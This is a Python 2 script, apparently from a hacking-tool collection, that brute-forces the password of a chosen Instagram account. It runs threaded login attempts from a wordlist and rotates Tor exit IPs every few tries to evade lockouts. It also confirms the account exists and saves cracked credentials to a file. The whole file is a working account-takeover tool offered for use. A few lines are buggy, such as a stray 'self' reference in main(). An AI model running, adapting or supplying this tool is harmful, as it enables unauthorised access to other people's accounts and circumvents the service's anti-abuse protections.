# Date: 08/06/2017
# Distro: Kali Linux
# Author: Ethical-H4CK3R
# Description: Bruteforce Instagram
#
#

import os
import time
import urllib
import argparse
import threading
import subprocess
from platform import platform
from Core.tor import TorManager
from Core.browser import Browser

class Instagram(TorManager,Browser):
 def __init__(self,username,wordlist):
  self.username = username
  self.wordlist = wordlist
  self.lock = threading.Lock()

  self.ip = None # current ip address
  self.tries = 0
  self.wait = False # wait for connection
  self.alive = True # is bruter still running
  self.isFound = False # is the password found?

  self.passlist = [] # temporary storage; holds a max of 5 passwords
  self.recentIps = [] # temporary storage; holds a max of 5 ip addresses

  # for browser
  self.url = 'https://www.instagram.com/accounts/login/?force_classic_login'
  self.form1 = 'username'
  self.form2 = 'password'

  Browser.__init__(self)
  TorManager.__init__(self)

  self.n = '\033[0m'  # null ---> reset
  self.r = '\033[31m' # red
  self.g = '\033[32m' # green
  self.y = '\033[33m' # yellow
  self.b = '\033[34m' # blue

 def kill(self,msg=None):
  self.alive = False
  self.stopTor()
  try:
   if self.isFound:
    self.display(msg)
    print '  [-] Password Found'

    with open('Cracked.txt','a') as f:
     f.write('[-] Username: {}\n[-] Password: {}\n\n'.\
     format(self.username,msg))

   if all([not self.isFound, msg]):
    print '\n  [-] {}'.format(msg)
  finally:exit()

 def modifylist(self):
  if len(self.recentIps) == 5:
   del self.recentIps[0]

  # failsafe
  if len(self.recentIps) > 5:
   while all([len(self.recentIps) > 4]):
    del self.recentIps[0]

 def manageIps(self,rec=2):
  ip = self.getIp()
  if ip:
   if ip in self.recentIps:
    self.updateIp()
    self.manageIps()
   self.ip = ip
   self.recentIps.append(ip)
  else:
   if rec:
    self.updateIp()
    self.manageIps(rec-1)
   else:
    self.connectionHandler()

 def changeIp(self):
  self.createBrowser()
  self.updateIp()

  self.manageIps()
  self.modifylist()
  self.deleteBrowser()

 def setupPasswords(self):
  with open(self.wordlist,'r') as passwords:
   for pwd in passwords:
    pwd = pwd.replace('\n','')
    if len(self.passlist) < 5:
     self.passlist.append(pwd)
    else:
     while all([self.alive,len(self.passlist)]):pass
     if not len(self.passlist): # just making sure, because self.alive could be false
      self.passlist.append(pwd)

  # done reading file
  while self.alive:
   if not len(self.passlist):
    self.alive = False

 def connectionHandler(self):
  if self.wait:return
  self.wait = True
  print '  [-] Waiting For Connection {}...{}'.format(self.g,self.n)
  while all([self.alive,self.wait]):
   try:
    self.updateIp()
    urllib.urlopen('https://wtfismyip.com/text')
    self.wait = False
    break
   except IOError:
    time.sleep(1.5)
  self.manageIps()

 def attempt(self,pwd):
  with self.lock:
   self.tries+=1
   self.createBrowser()
   html = self.login(pwd)
   self.deleteBrowser()

   if html:
    if all([not self.form1 in html,not self.form2 in html]):
     self.isFound = True
     self.kill(pwd)
    del self.passlist[self.passlist.index(pwd)]

 def run(self):
  self.display()
  time.sleep(1.3)
  threading.Thread(target=self.setupPasswords).start()
  while self.alive:
   bot = None # workers

   for pwd in self.passlist:
    bot = threading.Thread(target=self.attempt,args=[pwd])
    bot.start()

   # wait for bot
   if bot:
    while all([self.alive,bot.is_alive()]):pass
    if self.alive:
     self.changeIp()

 def display(self,pwd=None):
  pwd = pwd if pwd else ''
  ip = self.ip if self.ip else ''
  creds = self.r if not self.isFound else self.g # credentials color
  attempts = self.tries if self.tries else ''

  subprocess.call(['clear'])
  print ''
  print '  +------ Instagram ------+'
  print '  [-] Username: {}{}{}'.format(creds,self.username.title(),self.n)
  print '  [-] Password: {}{}{}'.format(creds,pwd,self.n)
  print '  [-] Proxy IP: {}{}{}'.format(self.b,ip,self.n)
  print '  [-] Attempts: {}{}{}'.format(self.y,attempts,self.n)
  print ''

  if not ip:
   print '  [-] Obtaining Proxy IP {}...{}'.format(self.g,self.n)
   self.changeIp()
   time.sleep(1.3)
   self.display()

def main():
 # assign arugments
 args = argparse.ArgumentParser()
 args.add_argument('username',help='Email or username')
 args.add_argument('wordlist',help='wordlist')
 args = args.parse_args()

 # assign variables
 engine = Instagram(args.username,args.wordlist)

 # does tor exists?
 if not os.path.exists('/usr/sbin/tor'):
  try:engine.installTor()
  except KeyboardInterrupt:engine.kill('Exiting {}...{}'.format(self.g,self.n))
  if not os.path.exists('/usr/sbin/tor'):
   engine.kill('Please Install Tor'.format(engine.y,engine.r,engine.n))

 # does the account exists?
 if not engine.exists(engine.username):
  engine.kill('The Account \'{}\' does not exists'.format(engine.username.title()))

 # start attack
 try:
  engine.run()
 finally:
  if not engine.isFound:
   engine.kill('Exiting {}...{}'.format(engine.g,engine.n))

if __name__ == '__main__':
 if not 'kali' in platform():
  exit('Kali Linux required')

 if os.getuid():
  exit('root access required')
 else:
  main()
